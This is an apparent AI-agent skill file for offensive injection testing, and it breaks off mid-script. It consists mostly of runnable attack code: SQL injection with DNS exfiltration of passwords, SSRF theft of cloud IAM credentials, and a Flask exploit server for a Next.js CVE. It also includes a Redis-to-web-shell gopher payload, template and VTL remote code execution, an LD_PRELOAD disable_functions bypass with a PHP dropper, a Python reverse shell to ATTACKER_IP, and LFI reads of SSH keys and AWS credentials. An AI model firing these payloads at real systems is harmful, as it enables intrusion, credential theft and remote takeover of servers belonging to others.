---
name: injection-hunt
description: SQLi, NoSQLi, SSRF, XXE, SSTI, CMDi, LFI, RFI, deserialization, smuggling, cache poisoning, disable_functions bypass. After DISCOVERY finds candidates — active testing, payload firing, CVE verification. Use when testing INJECTION vulnerabilities.
---

# SKILL-INJECTION-HUNT — Injection Vulnerabilities — Hunt
# Phase Coverage: 3-4, 7-10, 10.1, 16-19, 22-24, 31-32, 38, 40-41
# Vuln Classes: SQLi, NoSQLi, SSRF, XXE, SSTI(inc. VTL/API Gateway), CMDi, LFI, RFI,
#               Deserialization(PHP/Java/Python chains), File Upload(inc. ImageMagick),
#               Smuggling, Cache Poisoning, CRLF, HPP, GraphQL, LDAP, XPath,
#               disable_functions Bypass (Chankro LD_PRELOAD)
# Purpose: Server-side injection vulnerability exploitation — payloads, techniques, WAF bypass
# v3.3 HOOKS: Payload Mutation Engine (deterministic), DOM Analyzer (observation gate), OAST (blind confirm)

---

## v3.3 Automation Hooks — Mandatory for ALL Injection Hunt

```
PAYLOAD MUTATION ENGINE (v3.3):
  → NEVER manually guess payload variations. ALWAYS use the mutation engine.
  → python3 mcp/payload_mutator.py --seed "<base_payload>" --strategy bypass_waf
  → python3 mcp/payload_mutator.py --seed "<base_payload>" --all  (all 11 strategies)
  → Or via MCP: payload_mutate { seed, strategy }
  → Strategies: url_encode_all, url_encode_all_double, tag_break, bypass_waf,
                base64_wrap, unicode_escape, html_entity, html_entity_full,
                json_escape, sql_comment_wrap, case_variation

OBSERVATION GATE (v3.3):
  → After EVERY payload: python3 mcp/dom_analyzer.py --control <baseline.html> \
        --true-condition <injected_response.html> --false-condition <inert_response.html>
  → Or via MCP: dom_analyze { control, true_condition, false_condition }
  → structural_divergence_detected MUST be true before transitioning to REPRODUCE.
  → This gate eliminates false positives from timestamps/nonces/CSRF tokens.

OAST CONFIRMATION (v3.3):
  → For blind injections: generate token → embed → fire → poll
  → python3 mcp/oast_manager.py --action generate --correlation-id "{vuln}_{surface}"
  → Then: python3 mcp/oast_manager.py --action poll
  → Or via MCP: oast_generate → oast_poll
```

---

## Phase 3: SQL Injection (SQLi) — CIA: C:H I:H A:M

```
TRIGGER: Phase 2 assigns SQLi to a surface, or JS signals DB interaction.
SURFACE TYPES: login, search, filter, user lookup, report generation, any DB-query endpoint.

TIER SYSTEM: Standard → Complex → Advanced
  STANDARD: Basic error-based, union-based, boolean/time-based blind
  COMPLEX: WAF bypass, stacked queries, second-order, out-of-band
  ADVANCED: JSON parameter injection, HTTP parameter pollution SQLi, 
            filter evasion via Unicode, HPP-based split-and-join,
            DNS exfiltration via LOAD_FILE, custom tamper chains
```

### SUB-PHASE 3.2: HUNT

**Standard Error-Based:**
```bash
for char in "'" '"' "' OR '1'='1" "1 AND 1=2--" "1 UNION SELECT NULL--"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$char''',safe=''))")
  RESP=$(curl -sk "$TARGET/endpoint?id=$ENC" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -iE "syntax|error|mysql|sqlite|postgresql|unrecognized|exception"
done
```

**Standard Time-Based Blind:**
```bash
for payload in "' AND SLEEP(5)--" "'; WAITFOR DELAY '0:0:5'--" "'; SELECT pg_sleep(5)--"; do
  T=$(curl -sk -o /dev/null -w "%{time_total}" "$TARGET/endpoint?id=1$payload")
  python3 -c "t=float('$T'); exit(0 if t<4.5 else 1)" \
    || echo "[SQLI TIMING — CIA:C:H] $payload → ${T}s"
done
```

**Complex WAF Bypass Tier 1 (Whitespace/Case):**
```bash
for payload in "1'/**/UNION/**/SELECT/**/1,2,3--" "1'%0bUNiON%0bSELeCT%0b1,2,3--"; do
  RESP=$(curl -sk "$TARGET/endpoint?id=$payload" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -oE "1|2|3" | head -3
done
```

**Advanced DNS Exfiltration:**
```bash
COLLAB=$(mcp_burp_generate_collaborator_payload | grep payload_url | cut -d'"' -f4)
curl -sk "$TARGET/endpoint?id=1' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.$COLLAB.'\\a.txt'))--"
mcp_burp_get_collaborator_interactions(payload_id=PAYLOAD_ID)
```

---

## Phase 4: NoSQL Injection — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns NoSQLi to a surface, or JS signals MongoDB/Mongoose.
SURFACE TYPES: login endpoints, search, any endpoint backed by MongoDB/CouchDB/Firebase/DynamoDB.
```

### SUB-PHASE 4.2: HUNT

**Standard Operator Injection:**
```bash
for payload in \
  '{"email":"admin@t.com","password":{"$ne":""}}' \
  '{"email":{"$gt":""},"password":{"$gt":""}}' \
  '{"$where":"sleep(5000)"}'; do
  RESP=$(curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" -d "$payload")
  echo "$RESP" | grep -v "HTTP:4[0-9][0-9]"
done
```

**Advanced MongoDB $accumulator (4.4+):**
```bash
curl -sk -X POST "$TARGET/api/aggregate" -H "Content-Type: application/json" \
  -d '{
    "pipeline": [{
      "$group": {
        "_id": "$field",
        "acc": {
          "$accumulator": {
            "init": "function() { return require(\"child_process\").execSync(\"id\").toString(); }",
            "accumulate": "function(state, value) { return state; }",
            "merge": "function(s1, s2) { return s1; }",
            "lang": "js"
          }
        }
      }
    }]
  }'
```

**Advanced BSON Type Confusion:**
```bash
curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"email": 1, "password": 1}' -w " HTTP:%{http_code}"
# If backend does db.users.findOne({email: req.body.email}) and email is int 1,
# MongoDB matches any document where email field exists (type mismatch)
```

---

## Phase 7: SSRF — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns SSRF, or JS signals fetch(userInput), axios.get(url).
SURFACE TYPES: URL preview, import/fetch features, webhooks, PDF generators, file URL params.
```

### SUB-PHASE 7.2: HUNT

**Standard Probe Script:**
```bash
COLLAB=$(mcp_burp_generate_collaborator_payload 2>/dev/null | grep payload_url | cut -d'"' -f4)
PROBES=(
  "http://127.0.0.1/" "http://localhost/" "http://127.1/" "http://0/"
  "http://0x7f000001/" "http://2130706433/" "http://0177.0.0.1/"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://127.0.0.1:6379/" "http://127.0.0.1:9200/" "http://127.0.0.1:8500/"
  "file:///etc/passwd" "dict://127.0.0.1:11211/stats" "gopher://127.0.0.1:6379/_INFO"
  "$COLLAB"
)
for probe in "${PROBES[@]}"; do
  RESP=$(curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/json" \
         -H "Authorization: Bearer $TOKEN" -d "{\"$PARAM\":\"$probe\"}")
  echo "$RESP" | grep -vE "HTTP:4[0-9][0-9]"
done
```

**Advanced IMDSv2 Token Theft:**
```bash
TOKEN=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -sk -X POST "$TARGET/api/preview" -H "Content-Type: application/json" \
  -d "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\", \"headers\":{\"X-aws-ec2-metadata-token\":\"$TOKEN\"}}"
```

**Advanced Gopher/Redis Protocol Abuse:**
```bash
PAYLOAD="gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20x%20%27%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%27%0D%0ASAVE"
curl -sk -X POST "$TARGET/api/preview" -H "Content-Type: application/json" -d "{\"url\":\"$PAYLOAD\"}"
```

### NextJS-Specific SSRF — CVE-2024-34351 (Full Read)

```
SOURCE: raw/SSRF.md — Assetnote, May 2024
CVE: CVE-2024-34351 (fixed in NextJS v14.1.1)
TECH: Server Actions redirect creates server-side fetch using attacker-controlled Host header
v3.3 HOOKS: OAST (blind SSRF confirmation), Payload Mutator (Host header encoding variants)

THREE SURFACES:
  A. _next/image with wildcard ** remotePatterns → blind SSRF
  B. _next/image with specific remotePatterns + open redirect → blind SSRF
  C. Server Actions redirect with forged Host header → FULL READ SSRF (CVE-2024-34351)
```

**Surface A — `_next/image` Wildcard remotePatterns (Blind SSRF):**
```bash
# If remotePatterns uses "**" (any hostname), exploit directly
# The endpoint fetches the URL and resizes the image server-side
# If response has Content-Type image/*, response is returned
# If not, response is not returned but request is still made → BLIND SSRF

# Test blind SSRF to internal endpoints
OAST_TOKEN=$(python3 -c "
import requests, json
r = requests.post('http://localhost:8080/api/oast/generate', json={'correlation_id':'nextjs_ssrf_0001'})
print(r.json().get('token',''))
")

for target in \
  "http://127.0.0.1/" \
  "http://127.0.0.1:9200/" \
  "http://169.254.169.254/latest/meta-data/" \
  "http://metadata.google.internal/" \
  "http://$OAST_TOKEN.oastify.com/"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$target', safe=''))")
  RESP=$(curl -sk -w " HTTP:%{http_code},SIZE:%{size_download}" \
    "$TARGET/_next/image?url=$ENC&w=256&q=75")
  echo "[_next/image] $target → $RESP"
done

# oast_poll to check for blind callbacks
```

**Surface B — `_next/image` + Open Redirect Chain:**
```bash
# If remotePatterns whitelists specific domains, chain through open redirect
# on a whitelisted domain to reach internal hosts

# Step 1: Find open redirect on whitelisted domain (e.g., third-party.com)
# Step 2: Chain: _next/image → whitelisted redirect → internal target
for redirect_url in \
  "https://third-party.com/logout?url=https://127.0.0.1:9200/" \
  "https://cdn.example.com/redirect?to=http://169.254.169.254/latest/meta-data/"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$redirect_url', safe=''))")
  curl -sk -w " HTTP:%{http_code}" "$TARGET/_next/image?url=$ENC&w=256&q=75"
done

# Check if XML response leaks (when dangerouslyAllowSVG or old NextJS)
# If response starts with <?xml → full SSRF read of XML endpoints
```

**Surface C — Server Actions SSRF (CVE-2024-34351 Full Read):**

```
PRECONDITIONS:
  1. Server must have at least one "use server" action defined
  2. One of those actions must redirect to a /relative-path (e.g., redirect("/login"))
  3. Host header must be forgeable (no Host validation)

MECHANISM:
  NextJS createRedirectRenderResult() takes the Host header from the client
  request and uses it to construct a server-side fetch URL:
    fetchUrl = `${protocol}://${host}${basePath}${redirectUrl}`
  
  The server-side fetch chain:
    1. HEAD request to fetchUrl
    2. If HEAD returns Content-Type: text/x-component → GET request
    3. GET response body is returned to client as FlightRenderResult
  
  EXPLOIT: Set up a Flask server that:
    - On HEAD: returns 200 + Content-Type: text/x-component
    - On GET: redirects (302) to the real SSRF target (metadata, internal service)
    → Result: full read of the redirect target's response body
```

**Hunt — Server Actions SSRF (Full Read):**

```bash
# Step 1: Find a Next-Action ID that triggers a redirect
# Extract from JS: grep for '"use server"' or action ID hex patterns
# Common actions: login redirect, auth guard, error redirect

# Step 2: Set up Flask exploit server
cat > /tmp/nextjs_exploit.py << 'PYEOF'
from flask import Flask, Response, request, redirect
import sys

app = Flask(__name__)
SSRF_TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect(SSRF_TARGET)

print(f"[*] Exploit server ready. Redirecting GET requests to: {SSRF_TARGET}")
print(f"[*] Listen on: 0.0.0.0:8080")
app.run(host='0.0.0.0', port=8080, debug=False)
PYEOF

# Step 3: Start exploit server (in background or on VPS)
# python3 /tmp/nextjs_exploit.py "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 4: Trigger the SSRF with forged Host header pointing to your exploit server
ACTION_ID="<extracted_action_id>"  # 40-char hex from JS
EXPLOIT_HOST="your-vps-ip:8080"

curl -sk -X POST "$TARGET/" \
  -H "Host: $EXPLOIT_HOST" \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain" \
  -H "Accept: text/x-component" \
  -d '{}' -w " HTTP:%{http_code},SIZE:%{size_download}"

# If the response contains the SSRF target's content → FULL READ SSRF CONFIRMED
# e.g., IAM credentials JSON, internal service response

# Step 5: Read cloud metadata (all providers)
for metadata_url in \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://169.254.169.254/latest/meta-data/" \
  "http://metadata.google.internal/computeMetadata/v1/" \
  "http://100.100.100.200/latest/meta-data/"; do
  echo "=== $metadata_url ==="
  # Restart exploit server with new target
  # python3 /tmp/nextjs_exploit.py "$metadata_url" &
  # sleep 1
  curl -sk -X POST "$TARGET/" \
    -H "Host: $EXPLOIT_HOST" \
    -H "Next-Action: $ACTION_ID" \
    -H "Content-Type: text/plain" \
    -d '{}' | head -20
done

# Step 6: OAST confirmation for blind SSRF
# oast_generate { correlation_id: "nextjs_server_actions_ssrf" }
# Set Flask server to redirect to OAST URL
# python3 /tmp/nextjs_exploit.py "http://<oast_token>.oastify.com/"
# Fire action → oast_poll for callback
```

**CVE-2024-34351 WAF/Host Header Bypass:**
```bash
# If Host header is validated, try encoding/variants
HOST_BYPASSES=(
  "$EXPLOIT_HOST"
  "$EXPLOIT_HOST:443"
  "$EXPLOIT_HOST.:80"          # trailing dot = FQDN
  "$EXPLOIT_HOST%00"           # null byte
  "x:$EXPLOIT_HOST@$TARGET"    # auth URL confusion
  "x@$EXPLOIT_HOST"            # Host @ confusion
  "$TARGET:$EXPLOIT_PORT@"     # port confusion
)
for h in "${HOST_BYPASSES[@]}"; do
  RESP=$(curl -sk -X POST "$TARGET/" \
    -H "Host: $h" \
    -H "Next-Action: $ACTION_ID" \
    -H "Content-Type: text/plain" -d '{}' -w " HTTP:%{http_code}")
  echo "Host: $h → $RESP"
done
```

**Payload Mutation — Host Header Encoding:**
```bash
# Use v3.3 Payload Mutator for Host header obfuscation
python3 mcp/payload_mutator.py --seed "evil.com" --strategy url_encode_all
python3 mcp/payload_mutator.py --seed "evil.com" --strategy html_entity
python3 mcp/payload_mutator.py --seed "evil.com" --strategy bypass_waf
```

---

## Phase 8: XXE — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns XXE, or content-type application/xml accepted.
SURFACE TYPES: XML file upload, XML import, SOAP endpoints.
```

### SUB-PHASE 8.2: HUNT

**Classic file read:**
```bash
PAYLOAD='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" --data-binary "$PAYLOAD" | grep -q "root:x:"
```

**XInclude (when DOCTYPE blocked):**
```bash
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
```

**SVG upload vector:**
```bash
cat > /tmp/xxe_test.svg << 'SVG'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
SVG
curl -sk -X POST "$TARGET/upload" -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xxe_test.svg;type=image/svg+xml" | grep "root:"
```

---

## Phase 9: SSTI — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns SSTI, or JS signals template engine references.
SURFACE TYPES: template-based rendering (email bodies, PDFs, reports, custom pages).
```

### SUB-PHASE 9.2: HUNT

**Engine fingerprinting:**
```bash
SSTI_PROBES=('{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '*{7*7}' '{7*7}' '@(7*7)' '{{7*"7"}}')
for probe in "${SSTI_PROBES[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$probe''',safe=''))")
  RESP=$(curl -sk "$TARGET/endpoint?name=$ENC" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -oE "49|7777777" && echo "[SSTI — CIA:C:H] $probe"
done
```

**Engine-specific RCE (test after engine confirmed):**
```bash
# Jinja2:     {{cycler.__init__.__globals__.os.popen('id').read()}}
# Twig:       {{["id"]|filter("system")}}
# FreeMarker: ${"freemarker.template.utility.Execute"?new()("id")}
# ERB:        <%= `id` %>
```

### SUB-PHASE 9.4: API GATEWAY VTL RCE (Velocity Template Language)

```
PATTERN: API Gateway mapping templates evaluate attacker-controlled VTL with
         unrestricted Java reflection via exposed helper objects ($util).
SOURCE: raw/exploitarium/floci-apigateway-vtl-rce-poc
```

**HUNT:**

**Step 1 - Create REST API:**
```bash
curl -sk -X POST "$TARGET/restapis" -H "Content-Type: application/json" \
  -d '{"name":"test"}'
```

**Step 2 - Store malicious response template with Java reflection:**
```bash
VTL_PAYLOAD='#set($pb=$util.getClass().forName("java.lang.ProcessBuilder"))
#set($cmd=$util.parseJson("["sh","-c","id > /tmp/vtl_rce"]"))
#set($p=$pb.getConstructor($util.getClass().forName("java.util.List")).newInstance($cmd))
#set($proc=$p.start())#set($exit=$proc.waitFor()){"ok":true}'

curl -sk -X PUT "$TARGET/restapis/{apiId}/resources/{resId}/methods/GET/integration/responses/200" \
  -H "Content-Type: application/json" \
  -d "{\"responseTemplates\":{\"application/json\":\"$VTL_PAYLOAD\"}}"
```

**Step 3 - Deploy stage and invoke:**
```bash
curl -sk -X POST "$TARGET/restapis/{apiId}/deployments" -d '{"stageName":"prod"}'
curl -sk "$TARGET/execute-api/{apiId}/prod/rce"
```

**IAM WRONG-SCOPE BYPASS:**
```bash
# Use Authorization: AWS4-HMAC-SHA256 Credential=<key>/<date>/<region>/iam/aws4_request
# The "iam" scope does not map to API Gateway actions -> defaults to ALLOW.
curl -sk -X POST "$TARGET/restapis" \
  -H 'Authorization: AWS4-HMAC-SHA256 Credential=AKIAEXAMPLE/20260623/us-east-1/iam/aws4_request, SignedHeaders=host, Signature=test'
```

---

## Phase 10: Command Injection (CMDi) — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns CMDi, or JS signals exec/spawn/child_process.
SURFACE TYPES: ping/traceroute utilities, DNS lookup tools, any feature passing input to shell.
```

### SUB-PHASE 10.2: HUNT

**Timing-based:**
```bash
CMDI_PAYLOADS=(
  "; sleep 5 #"    "| sleep 5"    '$(sleep 5)'    '`sleep 5`'
  "&& sleep 5"     "%0a sleep 5"  "%0d%0a sleep 5"
  "{sleep,5}"      "||sleep${IFS}5"
)
for payload in "${CMDI_PAYLOADS[@]}"; do
  T=$(curl -sk -o /dev/null -w "%{time_total}" -X POST "$TARGET$ENDPOINT" \
       -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
       -d "{\"$PARAM\":\"test$payload\"}")
  python3 -c "t=float('$T'); exit(0 if t<4 else 1)" \
    || echo "[CMDI TIMING — CIA:RCE] $payload → ${T}s"
done
```

**Space bypass:** {cat,/etc/passwd} | cat${IFS}/etc/passwd | cat</etc/passwd
**Keyword bypass:** c\at /etc/passwd | c'a't /etc/passwd
**Base64:** echo 'aWQ=' | base64 -d | sh

---

## Phase 10.1: PHP disable_functions Bypass — CIA: C:H I:H A:H

```
TRIGGER: PHP shell uploaded, system()/exec() return empty, disable_functions restricts execution.
SURFACE TYPES: PHP apps with disable_functions, CTF challenges, hardened shared hosting.
PREREQUISITES: putenv() available AND (mail() available OR another child-process trigger).
```

### SUB-PHASE 10.1.2: HUNT — Chankro LD_PRELOAD Bypass

**Method 1: Chankro (most reliable — mail + putenv)**
```bash
# Step 1: Compile malicious shared object on attacker machine
cat > /tmp/chankro.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("CHANKRO_CMD");
    char *out = getenv("CHANKRO_OUT");
    if (cmd) {
        FILE *fp = fopen(out ? out : "/tmp/output.txt", "w");
        FILE *pipe = popen(cmd, "r");
        if (fp && pipe) {
            char buf[4096];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), pipe)) > 0)
                fwrite(buf, 1, n, fp);
            pclose(pipe);
            fclose(fp);
        }
    }
}
CEOF
gcc -shared -fPIC -o /tmp/chankro.so /tmp/chankro.c

# Step 2: Base64-encode for PHP upload
base64 /tmp/chankro.so > /tmp/chankro.b64

# Step 3: Create PHP dropper that decodes + triggers
cat > /tmp/dropper.php << 'PEOF'
<?php
$b64 = file_get_contents('/dev/stdin');  // or hardcode base64
file_put_contents('/tmp/chankro.so', base64_decode($b64));
putenv("CHANKRO_CMD=" . $_GET['cmd']);
putenv("CHANKRO_OUT=/tmp/output.txt");
putenv("LD_PRELOAD=/tmp/chankro.so");
mail("a@b.com", "", "");
usleep(100000);
echo file_get_contents('/tmp/output.txt');
?>
PEOF
```

**Method 2: Python shell via upload + disable_functions check**
```bash
# If Python is available on target but PHP exec is disabled:
# Upload a Python reverse shell, access it directly via URL
# Python不受disable_functions影响

# Create Python reverse shell
cat > /tmp/shell.py << 'PYEOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
PYEOF

# Upload via the same file upload vector used for PHP shell
```

**Method 3: PHP create_function() injection**
```php
<?php
// If create_function is available (deprecated but still works in some PHP versions)
$func = create_function('', 'system("id");');
$func();
// Or via parameter injection
create_function('$x', 'system($_GET["cmd"]);');
?>
```

**Method 4: preg_replace /e modifier (PHP < 7.0)**
```php
<?php
// If preg_replace with /e modifier is available (PHP < 7.0)
preg_replace('/.*/e', 'system("id")', 'test');
// Or in user input context
preg_replace('/(' . $_GET['input'] . ')/e', 'system("id")', 'test');
?>
```

**Method 5: assert() code execution**
```php
<?php
// If assert() is available and not disabled
assert('system("id")');
// Or via parameter
assert($_GET['code']);
?>
```

**Method 6: LD_PRELOAD via alternative child-process triggers**
```php
<?php
// If mail() is disabled but other child-process functions exist
// Try: error_log(), mb_send_mail(), orntl_exec(), etc.

// Using error_log with SMTP
putenv("LD_PRELOAD=/tmp/chankro.so");
error_log("test", 1, "attacker@oast.fun", "Subject: test\n\n");

// Using pcntl_exec if available
putenv("LD_PRELOAD=/tmp/chankro.so");
pcntl_exec("/usr/sbin/sendmail", ["-t"]);
?>
```

---

## Phase 16: Insecure Deserialization -- CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns deserialization, or JS signals serialize/deserialize/unserialize/pickle.
SURFACE TYPES: PHP apps, Java apps, Python pickle endpoints, .NET BinaryFormatter, Node.js node-serialize.
```

### SUB-PHASE 16.2: HUNT

**PHP Deserialization Chain (StreamBucket -> SOAP -> RCE):**
```
SOURCE: raw/exploitarium/php857-streambucket-soap-rce-rpoc
PATTERN: ArrayIterator property mutation bypasses typed-property invariants,
         StreamBucket type confusion creates fake zend_string pointer,
         SOAP cookie numeric key writes zif_system over zend_execute_internal.

CHAIN OVERVIEW:
  1. ArrayIterator mutates internal object properties (bypasses typed/readonly/visibility)
  2. StreamBucket::$data forged to non-string -> type confusion in php_stream_bucket_attach()
  3. Pointer disclosure via Z_STRLEN/Z_STRVAL on forged data
  4. Sprayed fake HashTable strings located in heap
  5. SoapClient::_cookies replaced with fake HashTable pointer
  6. Numeric Set-Cookie name triggers zend_symtable_update() -> zend_hash_index_update()
  7. Bucket.h write at zend_execute_internal offset overwrites with zif_system address
  8. Dynamic internal call triggers zif_system(command)
```

**PHP Generic Deserialization Probes:**
```bash
# Test if unserialize() is reachable via cookie/param
for payload in 'O:8:"stdClass":0:{}' 'a:2:{i:0;s:4:"test";i:1;s:4:"test";}'   'O:14:"SplObjectStora":1:{s:4:"test";N;}' 'C:19:"SplDoublyLinkedList":33:{i:0;O:8:"stdClass":0:{}}'; do
  B64=$(echo -n "$payload" | base64 -w0)
  curl -sk "$TARGET/endpoint?data=$B64" -w " HTTP:%{http_code}"
done
```

**POP Chain Discovery (PHP):**
```bash
# Use PHPGGC to generate chains for common frameworks
phpggc Laravel/RCE1 system id | base64 -w0
phpggc Symfony/RCE4 system id | base64 -w0
phpggc Guzzle/FW1 system id | base64 -w0
# Test each chain at identified unserialize() sinks
```

**Java Deserialization:**
```bash
# Check for Java serialization magic bytes (AC ED 00 05)
curl -sk "$TARGET/api/data" -H "Accept: application/x-java-serialized-object" | xxd | head -3
# Generate ysoserial payloads
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
```

**Python Pickle:**
```bash
# Probe for pickle deserialization
python3 -c "import pickle,os; payload=pickle.dumps(os.system); print(payload[:50])"
curl -sk -X POST "$TARGET/api/load" --data-binary @payload.bin
```

---

## Phase 17: File Upload -- CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns file-upload, or JS signals upload, multipart, form-data.
```

### SUB-PHASE 17.2: HUNT

**Unrestricted upload:**
```bash
curl -sk -X POST "$TARGET/upload" -F "file=@shell.php;type=image/jpeg"
curl -sk -X POST "$TARGET/upload" -F "file=@test.svg;type=image/svg+xml"
```

**Extension bypass:**
```bash
# Double extension: shell.php.jpg, shell.php%00.jpg, shell.pHp, shell.PHP
# Content-type bypass: send PHP as image/jpeg, check if executed
```

### SUB-PHASE 17.4: IMAGEMAGICK GHOSTSCRIPT DELEGATE HIJACK

```
PATTERN: ImageMagick processes PDF/PS/EPS via Ghostscript delegate. When the
         delegate command uses a bare executable name (gswin64c.exe), Windows
         resolves it from the current working directory before PATH.
SOURCE: raw/exploitarium/imagemagick-gs-delegate-hijack-poc
```

**HUNT:**
```bash
# Step 1: Upload a benign PDF, observe conversion
curl -sk -X POST "$TARGET/upload" -F "file=@test.pdf"

# Step 2: Check if ImageMagick is used (response headers, error messages)
# Look for: "Magick", "ImageMagick", "convert", "delegate"

# Step 3: Test delegate search path (Windows)
# Plant a test gswin64c.exe in a location that gets searched
# When ImageMagick converts PDF, it launches the planted exe
```

---

## Phase 18: Path Traversal / LFI — CIA: C:H

```
TRIGGER: Phase 2 assigns LFI, or JS signals /api/file?name=, /view?page=.
SURFACE TYPES: file download, include/template endpoints, image serving, any ?file= or ?path= param.
```

### SUB-PHASE 18.2: HUNT

**Classic traversal:**
```bash
LFI_TARGETS=("../../../etc/passwd" "../../../../etc/passwd" "../../../etc/shadow"
  "~/.ssh/id_rsa" "~/.aws/credentials" "../../../var/www/html/.env" "../../../app/.env"
  "/proc/self/environ" "/proc/self/cmdline" "WEB-INF/web.xml" "C:\\Windows\\win.ini")
for target in "${LFI_TARGETS[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$target''',safe=''))")
  RESP=$(curl -sk "$TARGET/api/file?path=$ENC" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -qE "root:x:|aws_access|BEGIN RSA|APP_KEY|\[boot loader\]" \
    && echo "[LFI — CIA:C:H] $target"
done
```

**Filter bypass:**
```bash
for bypass in "....//....//etc/passwd" "..././..././etc/passwd" \
  "%2e%2e%2f%2e%2e%2fetc%2fpasswd" "..%252f..%252fetc%252fpasswd" \
  "..%c0%af..%c0%afetc%2fpasswd" "../../../../etc/passwd%00.jpg"; do
  RESP=$(curl -sk "$TARGET/view?page=$bypass" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -q "root:x:" && echo "[LFI bypass — CIA:C:H] $bypass"
done
```

**Encoding bypass (2026 CVEs):**
```bash
# Double encoding (CVE-2026-21726, CVE-2026-30869)
curl "$TARGET/view?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Unicode fullwidth (CVE-2026-35583)
curl "$TARGET/view?file=..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd"

# Null byte + mixed encoding
curl "$TARGET/view?file=%252e%252e%00%252fetc/passwd"
```
**Ref:** [[raw-refs/path-encoding-mutation-2026]], [[technique/path-encoding-mutation]]

**PHP wrappers:**
```bash
for wrapper in "php://filter/convert.base64-encode/resource=index.php" \
  "php://filter/read=string.rot13/resource=config.php"; do
  RESP=$(curl -sk "$TARGET/view?page=$wrapper" -H "Authorization: Bearer $USER1_TOKEN")
  [[ -n "$RESP" ]] && echo "[PHP WRAPPER] $wrapper"
done
```

**Log poisoning → RCE (chain with CMDi):**
```bash
curl -sk "$TARGET/" -A "<?php system(\$_GET['cmd']); ?>" -o /dev/null
curl -sk "$TARGET/view?page=../../../../var/log/apache2/access.log&cmd=id" | grep -v "PHP"
```

### SUB-PHASE 18.4: FILE UPLOAD FILENAME PATH TRAVERSAL → LFI

```
SOURCE: wiki/raw-refs/sudohunt-file-upload-lfi.md
PATTERN: When a file upload endpoint uses the attacker-supplied FILENAME
         (from multipart Content-Disposition) to construct the storage path,
         path traversal sequences in the filename cause the server to read
         arbitrary files instead of storing the uploaded content.
         
KEY INSIGHT: The `file=@` parameter sends the LOCAL file's path as the
             multipart filename. If the server uses this filename for storage,
             `../` sequences traverse to arbitrary server files.
```

**Hunt — Filename Path Traversal:**
```bash
# Test if filename parameter accepts path traversal
# The @ symbol sends LOCAL file content, but the filename= parameter
# tells the server what name to use for storage

# Classic traversal — read /etc/passwd
curl -sk -X POST "$TARGET/upload" \
  -F "file=@/etc/passwd;filename=../../../../../../../etc/passwd" \
  -w "\nHTTP:%{http_code}"

# Alternative: use --form-string for raw filename control
curl -sk -X POST "$TARGET/upload" \
  --form-string "file=@/etc/passwd;filename=../../../../../../../etc/passwd"

# Alternative: custom multipart with full path control
python3 - << 'PYEOF'
import requests
TARGET = "https://target.com/upload"
# Read a local file and inject traversal into the filename
files = {
